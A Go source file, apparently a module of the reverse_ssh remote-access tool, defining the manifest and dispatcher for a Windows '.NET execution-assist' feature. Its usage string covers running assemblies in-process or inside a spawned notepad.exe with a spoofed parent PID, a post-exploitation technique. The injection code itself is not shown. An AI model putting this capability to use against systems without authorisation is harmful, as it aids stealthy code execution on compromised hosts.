//go:build execass

package execass

import (
	"context"
	"fmt"
	"os"
	"runtime"

	"github.com/NHAS/reverse_ssh/internal/client/handlers/subsystems"
)

type Module struct{}

func New() *Module {
	return &Module{}
}

func (m *Module) Manifest() subsystems.Manifest {
	return subsystems.Manifest{
		Name:        "execass",
		Description: "Windows-only .NET execution-assist interface.",
		Version:     "1",
		Usage:       "execass (--artifact <path> | --stdin) [--sha256 <digest>] [--in-process --runtime v4 | --process notepad.exe --process-args '<args>' --ppid <pid>] [--args '<assembly args>'] [--timeout 30s] [--output-limit bytes]",
		BuildTags:   []string{"execass"},
		Platforms:   []string{"windows"},
		Dangerous:   true,
		Disabled:    runtime.GOOS == "windows" && !enabledByEnv(),
		Limits: subsystems.ModuleLimits{
			TimeoutSeconds: int(MaxTimeout.Seconds()),
			OutputBytes:    DefaultOutputBytes,
			StdinBytes:     MaxArtifactBytes,
			MaxArgs:        10,
		},
	}
}

func (m *Module) Run(ctx context.Context, io subsystems.ModuleIO, args []string) error {
	request, err := ParseRequest(args)
	if err != nil {
		return err
	}

	ctx, cancel := context.WithTimeout(ctx, request.Timeout)
	defer cancel()

	if err := request.LoadArtifact(io); err != nil {
		return err
	}

	if len(request.Artifact) == 0 {
		return fmt.Errorf("artifact is empty")
	}

	return newRunner().Run(ctx, request, io)
}

func enabledByEnv() bool {
	return os.Getenv("WRSSH_ENABLE_EXECASS") == "1" || os.Getenv("WRSSH_EXECASS_ENABLE") == "1"
}
